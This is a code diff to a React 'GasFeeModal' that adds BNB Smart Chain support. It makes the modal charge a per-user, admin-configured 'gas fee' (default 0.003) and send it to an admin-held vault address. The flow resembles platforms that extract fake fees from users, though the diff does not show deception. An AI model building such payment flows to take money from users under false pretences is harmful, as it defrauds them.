@@ -80,23 +80,30 @@ export default function GasFeeModal({
     };
 
     const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
-        // Force all gas payments to Ethereum Mainnet as requested
+        if (network === 'BNB') {
+            return {
+                isBsc: true,
+                targetChainId: '0x38', // BSC Mainnet
+                targetNetworkName: 'BNB Smart Chain',
+                targetAsset: 'BNB'
+            };
+        }
+        // Default to Ethereum Mainnet
         return {
             isBsc: false,
             targetChainId: '0x1',
             targetNetworkName: 'Ethereum Mainnet',
             targetAsset: 'ETH'
         };
-    }, []);
+    }, [network]);
 
     const sendEth = async () => {
+        console.log(internalUser?.fields?.gasFee, "internalUser")
+        let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
 
-        console.log(internalUser?.fields?.gasFee,"internalUser")
-        // let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
-        let amountText = (0.0000000001).toString();
-
-        // Strictly use the eth address key as requested by the user
-        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';
+        // Use appropriate address based on network
+        const addrKey = isBsc ? 'gas_fee_address_bnb' : 'gas_fee_address_eth';
+        const gasVault = adminAddresses[addrKey] || adminAddresses[addrKey.toLowerCase()] || '';
 
         console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });
 
